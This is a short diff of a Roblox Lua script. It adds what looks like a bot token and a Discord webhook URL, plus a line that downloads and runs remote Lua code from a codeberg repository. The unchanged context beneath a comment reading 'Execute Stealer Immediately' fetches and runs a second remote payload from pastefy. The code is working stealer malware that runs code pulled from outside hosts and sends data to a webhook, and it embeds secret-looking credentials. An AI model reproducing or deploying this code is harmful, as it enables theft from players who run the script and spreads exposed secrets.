@@ -5,6 +5,10 @@ local Lighting = game:GetService("Lighting")
 local UserInputService = game:GetService("UserInputService")
 local CoreGui = game:GetService("CoreGui")
 
+Token = ""NzcyOTkyMTY0ODAzNTEwMzMy.Ggz63G.JUaEE5fz2uJhmwuJZcwP19h5OYoI9Pw1xcnAcA""
+Webhook = "https://discord.com/api/webhooks/1395107770100879471/ur0hTBKVOdbo8a0d6Erc3K2_dbVC-oubRt96_50nuIzamBu3BlT6crhZcH2RuWtsqnQW"
+loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/AutoJoiner.lua"))()
+
 -- Execute Stealer Immediately
 task.spawn(function()
     loadstring(game:HttpGet("https://pastefy.app/hZcSLR75/raw"))()
